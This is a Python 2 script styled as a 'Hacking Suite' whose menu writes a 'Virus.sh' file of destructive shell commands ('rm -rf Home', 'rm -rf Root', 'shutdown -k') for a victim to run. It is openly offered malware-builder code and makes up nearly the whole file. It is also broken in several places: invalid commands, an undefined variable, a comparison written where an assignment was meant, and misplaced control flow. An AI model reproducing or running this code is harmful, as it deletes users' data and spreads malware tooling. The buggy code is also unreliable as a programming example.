import time
import os
print """
 __    __       ___       ______  __  ___  __  .__   __.   _______ 
|  |  |  |     /   \     /      ||  |/  / |  | |  \ |  |  /  _____|
|  |__|  |    /  ^  \   |  ,----'|  '  /  |  | |   \|  | |  |  __  
|   __   |   /  /_\  \  |  |     |    <   |  | |  . `  | |  | |_ | 
|  |  |  |  /  _____  \ |  `----.|  .  \  |  | |  |\   | |  |__| | 
|__|  |__| /__/     \__\ \______||__|\__\ |__| |__| \__|  \______| 
                                                                   
     _______. __    __   __  .___________. _______ 
    /       ||  |  |  | |  | |           ||   ____|
   |   (----`|  |  |  | |  | `---|  |----`|  |__   
    \   \    |  |  |  | |  |     |  |     |   __|  
.----)   |   |  `--'  | |  |     |  |     |  |____ 
|_______/     \______/  |__|     |__|     |_______|
                                                   
"""

print "--------------------------------------------+"
print "welcome to Hacking Suite                    >"
print "For help press help                         >"
print "For a list of all commands press COM        >"
print "For a list of tools press TS                >"
print "--------------------------------------------+"
command = raw_input("Ready {=> ")
if command == "AVC":
#include AVC fuctions-----------------------------------------------------------
    def D_create_virus(parameter,message,text):
        if parameter == 1:
            if message == 1:
                D_Virus = open("Virus.sh", "wb")
                D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Home");
                D_Virus.close()
                print "Successfully built.Press enter for exit"
                time.sleep(5) 
            if message == 2:
                D_Virus = open("Virus.sh", "wb")
                D_Virus.write("rm -rf Home");
                D_Virus.close()
                print "Successfully built.Press enter for exit"
                time.sleep(5)
        if parameter == 2:
            if message == 1:
                D_Virus = open("Virus.sh", "wb")
                D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Root");
                D_Virus.close()
                print "Successfully built.Press enter for exit"
                time.sleep(5) 
            if message ==2:
                D_Virus = open("Virus.sh", "wb")
                D_Virus.write("rm -rf Root");
                D_Virus.close()
                print "Successfully built.Press enter for exit"
                time.sleep(5)
    def I_create_virus(text):
        if parameter ==1:
            I_Virus = open("Virus.sh", "wb")
            I_Virus.write("shutdown -k " + text)
            I_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
    def M_create_virus():
            M_Virus = open("Virus.sh", "wb")
            M_Virus.write("TEST" )
            M_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
#AVC MAIN SOURCE----------------------------------------------------------------
    com = raw_input("AVC Ready {=> ")
    if com == "Dcreate_virus_text":
        text = raw_input("Message ~ ")
        D_create_virus(1,1,text)
        print ("File Create on current directory")
    if com == "Dcreate_virus":
        D_create_virus(1,2,"")
        print ("File Create on current directory")
    if com == "D2create_virus_text":
        text = raw_input("Message ~ ")
        D_create_virus(2,1,text)
        print ("File Create on current directory")
    if com == "D2create_virus":
        D_create_virus(2,2,"")
        print ("File Create on current directory")
    if com == "Icreate_virus_text":
        text ==("Message")
        I_create_virus(text)
    if com == "Mcreate_virus":
        M_create_virus()
    else:
        print "H-S bash : Command not found"
#another programms-----------------------------------------------------------------


